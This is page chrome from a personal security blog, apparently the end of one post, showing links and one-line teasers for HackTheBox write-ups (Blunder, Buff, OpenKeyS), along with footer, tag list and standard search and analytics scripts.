<a href="/posts/HTB-Blunder/"><div class="card-body"> <span class="timeago small" > Nov 4, 2020 <i class="unloaded">2020-11-04T20:40:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Blunder</h3><div class="text-muted small"><p> Enumeration Initial Information Before starting we are shown this this is a linux box and that they rate it as an easy box. Editing Hosts Lets add assign the ip address a domain name in our h...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Buff/"><div class="card-body"> <span class="timeago small" > Nov 22, 2020 <i class="unloaded">2020-11-22T12:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Buff</h3><div class="text-muted small"><p> Enumeration Initial Information Before starting we are shown this this is a windows box and that they rate it as an easy box. Editing Hosts Lets add assign the ip address a domain name in our...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-OpenKeyS/"><div class="card-body"> <span class="timeago small" > Dec 13, 2020 <i class="unloaded">2020-12-13T12:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - OpenKeyS</h3><div class="text-muted small"><p> Enumeration Initial Information Based on the information provided by HackTheBox, OpenKeys is rated as medium difficulty and is running OpenBSD for it’s Operating System. Editing hosts A domai...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-Blunder/" class="btn btn-outline-primary"><p>HackTheBox - Blunder</p></a> <a href="/posts/HTB-Buff/" class="btn btn-outline-primary"><p>HackTheBox - Buff</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/FreddiPhish">FreddiPhish</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/openbsd/">openbsd</a> <a class="post-tag" href="/tags/port-fowarding/">port fowarding</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/windows-iot/">windows iot</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://freddiphish.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script>
